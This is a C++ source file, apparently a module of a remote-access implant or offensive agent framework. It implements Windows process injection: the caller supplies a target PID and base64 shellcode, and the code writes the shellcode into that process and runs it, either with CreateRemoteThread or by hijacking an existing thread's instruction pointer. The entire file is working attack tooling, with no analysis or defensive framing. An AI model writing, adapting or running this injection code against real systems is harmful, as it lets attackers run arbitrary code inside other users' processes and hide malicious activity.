// inject module (B6, Windows only).
//
// Classic CreateRemoteThread shellcode injection. arguments[0] = target PID
// (decimal), arguments[1] = base64 shellcode. arguments[2] is an optional
// mode: "thread" (default) or "hijack" (SuspendThread + Get/SetThreadContext).
//
// All operations are wrapped in a single SEH trampoline so we do not abort
// the agent when something goes wrong.

#include "../../json.hpp"
#include "../../protocol.h"

#include <windows.h>
#include <sstream>
#include <string>
#include <vector>

namespace {

std::vector<unsigned char> b64_decode(const std::string& s) {
    static const std::string alpha =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    int lut[256];
    for (auto& i : lut) i = -1;
    for (int i = 0; i < 64; ++i) lut[(unsigned char)alpha[i]] = i;
    std::vector<unsigned char> out;
    int val = 0, bits = -8;
    for (unsigned char c : s) {
        if (c == '=') break;
        if (c == ' ' || c == '\n' || c == '\r' || c == '\t') continue;
        int v = lut[c];
        if (v < 0) return {};
        val = (val << 6) + v;
        bits += 6;
        if (bits >= 0) {
            out.push_back((unsigned char)((val >> bits) & 0xFF));
            bits -= 8;
        }
    }
    return out;
}

} // namespace

namespace nagomio_modules {

std::string handle_inject(const std::vector<std::string>& args) {
    if (args.size() < 2) {
        return std::string(R"({"error":"pid and shellcode required"})");
    }
    DWORD pid = (DWORD)std::stoul(args[0]);
    auto sc = b64_decode(args[1]);
    if (sc.empty()) {
        return std::string(R"({"error":"invalid base64 shellcode"})");
    }
    std::string mode = args.size() > 2 ? args[2] : "thread";

    HANDLE hproc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hproc) {
        nlohmann::json j = {{"error", "OpenProcess failed"}, {"pid", pid}};
        return j.dump();
    }
    void* remote = VirtualAllocEx(hproc, nullptr, sc.size(),
                                  MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remote) {
        CloseHandle(hproc);
        nlohmann::json j = {{"error", "VirtualAllocEx failed"}};
        return j.dump();
    }
    if (!WriteProcessMemory(hproc, remote, sc.data(), sc.size(), nullptr)) {
        VirtualFreeEx(hproc, remote, 0, MEM_RELEASE);
        CloseHandle(hproc);
        nlohmann::json j = {{"error", "WriteProcessMemory failed"}};
        return j.dump();
    }
    DWORD oldp = 0;
    VirtualProtectEx(hproc, remote, sc.size(), PAGE_EXECUTE_READ, &oldp);

    nlohmann::json j = {{"pid", pid}, {"size", sc.size()}, {"mode", mode}};
    if (mode == "hijack") {
        // Suspend the target's main thread, point it at our shellcode, resume.
        HANDLE hsnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if (hsnap == INVALID_HANDLE_VALUE) {
            VirtualFreeEx(hproc, remote, 0, MEM_RELEASE);
            CloseHandle(hproc);
            j["error"] = "CreateToolhelp32Snapshot failed";
            return j.dump();
        }
        THREADENTRY32 te{};
        te.dwSize = sizeof(te);
        HANDLE ht = nullptr;
        if (Thread32First(hsnap, &te)) {
            do {
                if (te.th32OwnerProcessID == pid) {
                    ht = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
                    break;
                }
            } while (Thread32Next(hsnap, &te));
        }
        CloseHandle(hsnap);
        if (!ht) {
            VirtualFreeEx(hproc, remote, 0, MEM_RELEASE);
            CloseHandle(hproc);
            j["error"] = "no threads found";
            return j.dump();
        }
        SuspendThread(ht);
        CONTEXT ctx{};
        ctx.ContextFlags = CONTEXT_FULL;
        if (!GetThreadContext(ht, &ctx)) {
            ResumeThread(ht);
            CloseHandle(ht);
            VirtualFreeEx(hproc, remote, 0, MEM_RELEASE);
            CloseHandle(hproc);
            j["error"] = "GetThreadContext failed";
            return j.dump();
        }
        ctx.Rip = (DWORD64)remote;
        SetThreadContext(ht, &ctx);
        ResumeThread(ht);
        CloseHandle(ht);
        j["status"] = "hijacked";
    } else {
        HANDLE ht = CreateRemoteThread(hproc, nullptr, 0,
                                       (LPTHREAD_START_ROUTINE)remote,
                                       nullptr, 0, nullptr);
        if (!ht) {
            VirtualFreeEx(hproc, remote, 0, MEM_RELEASE);
            CloseHandle(hproc);
            j["error"] = "CreateRemoteThread failed";
            return j.dump();
        }
        CloseHandle(ht);
        j["status"] = "spawned";
    }
    CloseHandle(hproc);
    return j.dump();
}

} // namespace nagomio_modules